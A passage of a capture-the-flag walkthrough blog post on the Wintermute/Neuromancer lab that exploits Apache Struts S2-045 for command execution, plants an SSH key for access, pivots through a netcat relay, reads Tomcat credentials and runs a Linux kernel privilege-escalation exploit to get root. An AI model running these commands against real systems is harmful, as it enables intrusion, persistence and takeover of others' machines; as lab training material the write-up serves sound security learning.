+<p><img src="/assets/images/wintermute/screenshot-10.png" alt="" /></p>
+
+<p>If we remember the directory into the note, so we browse on it.</p>
+
+<p>http://192.168.56.104:8080/struts2_2.3.15.1-showcase</p>
+
+<p><img src="/assets/images/wintermute/screenshot-11.png" alt="" /></p>
+
+<p>Struts version 2.3.15 is vulnerable to Remote Code Execution</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit struts 2.3.15
+<span class="nt">--------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                |  Path
+<span class="nt">--------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Apache Struts 2.0.1 &lt; 2.3.33 / 2.5 &lt; 2.5.10 - Arbitrary Code Execution                                        | multiple/remote/44556.py
+Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution <span class="o">(</span>1<span class="o">)</span>                                         | linux/remote/45260.py
+Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution <span class="o">(</span>2<span class="o">)</span>                                         | multiple/remote/45262.py
+Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - <span class="s1">'Jakarta'</span> Multipart Parser OGNL Injection <span class="o">(</span>Metasploit<span class="o">)</span>          | multiple/remote/41614.rb
+Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - Remote Code Execution                                           | linux/webapps/41570.py
+Apache Struts &lt; 1.3.10 / &lt; 2.3.16.2 - ClassLoader Manipulation Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>             | multiple/remote/41690.rb
+Apache Struts2 2.0.0 &lt; 2.3.15 - Prefixed Parameters OGNL Injection                                            | multiple/webapps/44583.txt
+<span class="nt">--------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+</code></pre></div></div>
+
+<p>We copy the exploit to our current directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/webapps/41570.py
+</code></pre></div></div>
+
+<h2 id="exploitation-1">Exploitation</h2>
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+
+<p>Apache Struts 2 versions 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 remote code execution exploit that provides a reverse shell.</p>
+
+<p>We run the script adding as parameter the URL and the id command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action <span class="nb">id</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> CVE: 2017-5638 - Apache Struts2 S2-045
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> cmd: <span class="nb">id
+
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
+</code></pre></div></div>
+
+<p>The command was successfully executed, we can try to get a reverse shell, but I prefer to access via SSH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action <span class="s2">"mkdir /home/ta/.ssh"</span>
+</code></pre></div></div>
+
+<p>We generate the SSH key pair.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s2">"ta123"</span> <span class="nt">-f</span> id_rsa
+</code></pre></div></div>
+
+<p>We create the authorized_keys file with the the public key inside the ssh directory in the ta’s home directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action <span class="s2">"echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXzybvylP8i
+qZivblk2Ezss0lYM4TsTMscRB1Hy9cy2r6Z4lXUv1Z5Y2cEuha/9YQ6O1w51f3iCBtWQUi+feKvlqhL6q8FEsF3ju4cdiD87rMPOHia1M4MYJoU4CEcN8Y8u1IN35Uvn+NBz+rad2ESwlbvsa3dBotTHWGvLR140HE1k
+qzrejm2z42DSE356qkY2I4+2xLoHtfQiIAVPl5p9YGcjwDs4NWeYFRZ8RbMYnW7pVD6Bj+hQedOn9uPM+wm1dUh+ZiEwgGFSeeKWvfR7N0LQ69+YhK0gAPY//6NiK300UFpGWW6D+RNyAq9+3zovqini3XPfnfLrhHtG
+vMbuN4Yzp9+g8N7Pz8nWXBLo/V3Yufxw99j7y3Rwj4LUVrGqWi7HUkQFSK/kIzUU81wJ54x+JrtToBuXIFl57fXz23NfBLsJMIIjYykTmbUGaTDWpmm2fRoCMdGQmr3EASDpvzuZSNsvVr5wqCSQ0CrJ3+NM3sKEqwZR
+ItFaad4mhE= &gt; /home/ta/.ssh/authorized_keys"</span>
+</code></pre></div></div>
+
+<p>We grant read and write permissions to the owner of the authorized_keys file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action <span class="s2">"chmod 600 /home/ta/.ssh/authorized_keys"</span>
+</code></pre></div></div>
+
+<p>We execute the following commands to set up a netcat relay to pivot as shown previously.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# <span class="nb">mknod</span> /tmp/backpipe2 p
+root@straylight:/root# nc <span class="nt">-lp</span> 34483 &lt; /tmp/backpipe2 | nc 192.168.56.104 34483 <span class="o">&gt;</span> /tmp/backpipe2
+</code></pre></div></div>
+
+<p>We access via SSH as user ta.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> ta 192.168.56.104 <span class="nt">-p</span> 34483 <span class="nt">-i</span> id_rsa
+The authenticity of host <span class="s1">'[192.168.56.104]:34483 ([192.168.56.104]:34483)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:oUL2wjfAFRqayjqOgc79xVYeSqvD92zqaV+4udNxJrw.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span><span class="o">[</span>192.168.56.104]:34483<span class="s1">' (ECDSA) to the list of known hosts.
+ ----------------------------------------------------------------
+|                Neuromancer Secure Remote Access                |
+| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
+ ----------------------------------------------------------------
+Enter passphrase for key '</span>id_rsa<span class="s1">': 
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+94 packages can be updated.
+44 updates are security updates.
+
+
+Last login: Tue Jul  3 21:53:25 2018
+ta@neuromancer:~$
+</span></code></pre></div></div>
+
+<p>We execute the find command to locate the tomcat-users.xml file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ta@neuromancer:/<span class="nv">$ </span>find / <span class="nt">-name</span> <span class="s1">'tomcat-users.xml'</span> 2&gt;/dev/null | xargs <span class="nb">cat</span>
+...
+&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">"Lady3Jane"</span> <span class="nv">password</span><span class="o">=</span><span class="s2">"&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;"</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">"manager-gui"</span>/&gt;
+...
+</code></pre></div></div>
+
+<p>As we can see, Lady3Jane’s password is encoded in HTML, we decode to plain text using the hURL utility.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hURL <span class="nt">-h</span> <span class="s2">"&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;"</span>
+
+Original     :: &amp;gt<span class="p">;</span>&amp;#33<span class="p">;</span>&amp;#88<span class="p">;</span>&amp;#120<span class="p">;</span>&amp;#51<span class="p">;</span>&amp;#74<span class="p">;</span>&amp;#97<span class="p">;</span>&amp;#110<span class="p">;</span>&amp;#101<span class="p">;</span>&amp;#120<span class="p">;</span>&amp;#88<span class="p">;</span>&amp;#33<span class="p">;</span>&amp;lt<span class="p">;</span>
+HTML DEcoded :: <span class="o">&gt;!</span>Xx3JanexX!&lt;
+</code></pre></div></div>
+
+<p>We change to the user lady3jane.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ta@neuromancer:/<span class="nv">$ </span>su - lady3jane
+Password: 
+lady3jane@neuromancer:~<span class="nv">$ </span><span class="nb">ls
+</span>custom-tomcat-chk.sh
+</code></pre></div></div>
+
+<p>We see a bash script in the home directory, I thought this script was being executed by a cron job, a way to escalate privileges, but it was not possible.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lady3jane@neuromancer:~<span class="nv">$ </span><span class="nb">cat </span>custom-tomcat-chk.sh 
+<span class="c">#!/bin/bash</span>
+<span class="c"># Health check for Neuromancer (root) to execute every 3 minutes.</span>
+<span class="c"># ..the AI tells me it can maintain security, server health, etc w/o forced intervention,</span>
+<span class="c"># but I beg to differ...hence the cron script.</span>
+
+<span class="o">&gt;</span> /tmp/tomcat_status.log
+
+<span class="nv">health</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-m</span> 5 <span class="nt">-Is</span> 127.0.0.1:8080 |grep HTTP/1.1<span class="si">)</span>
+
+<span class="k">case</span> <span class="s2">"</span><span class="nv">$health</span><span class="s2">"</span> <span class="k">in</span>
+
+  <span class="k">*</span>200<span class="k">*</span><span class="p">)</span>
+        <span class="nb">echo</span> <span class="s2">"Tomcat is Up"</span> <span class="o">&gt;</span> /tmp/tomcat_status.log
+        <span class="p">;;</span>
+  <span class="k">*</span><span class="p">)</span>
+        <span class="nb">echo</span> <span class="s2">"Tomcat is down"</span> <span class="o">&gt;</span> /tmp/tomcat_status.log
+        <span class="p">;;</span>
+  <span class="k">esac</span>
+
+lady3jane@neuromancer:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Another way is to find a kernel exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ta@neuromancer:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
+
+ta@neuromancer:~<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+Linux neuromancer 4.4.0-116-generic <span class="c">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+</code></pre></div></div>
+
+<p>A possible kernel exploit for this version in the following.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit 4.4.0
+<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
+ Exploit Title                                                                 |  Path                         
+<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
+...
+Linux Kernel &lt; 4.4.0-116 <span class="o">(</span>Ubuntu 16.04.4<span class="o">)</span> - Local Privilege Escalation         | linux/local/44298.c
+...
+<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
+</code></pre></div></div>
+
+<p>We copy the exploit to our current directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/44298.c
+</code></pre></div></div>
+
+<p>We compile the exploit on the attacking machine since gcc is not installed on the victim machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gcc 44298.c <span class="nt">-o</span> exp
+</code></pre></div></div>
+
+<p>We transfer the exploit to the victim machine via SSH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>scp <span class="nt">-i</span> id_rsa <span class="nt">-P</span> 34483 exp ta@192.168.56.104:exp  
+ <span class="nt">----------------------------------------------------------------</span>
+|                Neuromancer Secure Remote Access                |
+| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
+ <span class="nt">----------------------------------------------------------------</span>
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
+exp
+</code></pre></div></div>
+
+<p>We grant execution privileges to the compiled exploit, execute it, and we get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ta@neuromancer:~<span class="nv">$ </span><span class="nb">chmod </span>755 exp 
+ta@neuromancer:~<span class="nv">$ </span>./exp 
+task_struct <span class="o">=</span> ffff88000af43800
+uidptr <span class="o">=</span> ffff88000c915484
+spawning root shell
+root@neuromancer:~# <span class="nb">cd</span> /root/
+root@neuromancer:/root# <span class="nb">ls
+</span>flag.txt  struts2  velocity.log
+root@neuromancer:/root# <span class="nb">cat </span>flag.txt 
+be3306f431dae5ebc93eebb291f4914a
+root@neuromancer:/root#
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
